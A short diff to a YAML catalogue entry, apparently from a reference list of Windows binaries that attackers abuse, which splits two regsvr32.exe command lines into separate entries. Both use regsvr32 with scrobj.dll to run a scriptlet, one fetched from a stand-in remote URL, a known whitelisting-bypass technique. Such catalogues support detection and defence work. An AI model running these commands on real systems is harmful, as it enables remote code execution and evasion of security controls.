@@ -5,8 +5,9 @@ Author: ''
 Created: '2018-05-25'
 Categories: []
 Commands:
-  - Command: "regsvr32 /s /n /u /i:http://example.com/file.sct scrobj.dll    \n  \
-      \  \nregsvr32.exe /s /u /i:file.sct scrobj.dll"
+  - Command: regsvr32 /s /n /u /i:http://example.com/file.sct scrobj.dll
+    Description: ''
+  - Commands: regsvr32.exe /s /u /i:file.sct scrobj.dll
     Description: ''
 Full Path:
   - C:\Windows\System32\regsvr32.exe
